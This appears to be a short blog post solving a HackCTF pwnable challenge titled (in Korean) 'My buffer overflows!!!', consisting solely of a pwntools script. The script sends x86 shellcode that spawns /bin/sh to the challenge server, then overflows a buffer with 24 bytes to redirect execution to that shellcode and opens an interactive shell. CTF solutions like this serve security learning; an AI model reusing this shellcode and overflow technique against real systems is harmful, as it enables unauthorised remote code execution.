---
title: "[HackCTF] 내 버퍼가 흘러넘친다!!!"
date: 2020-07-09
ctf: HackCTF
tag: [pwnable]
layout: post
---
{% highlight python %}
from pwn import *
context.log_level="debug"
p = remote("ctf.j0n9hyun.xyz", 3003)
p.recv(1024)
p.send("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")
p.recv(1024)
p.sendline("A"*24+p32(0x0804a060))
p.interactive()
{% endhighlight %}
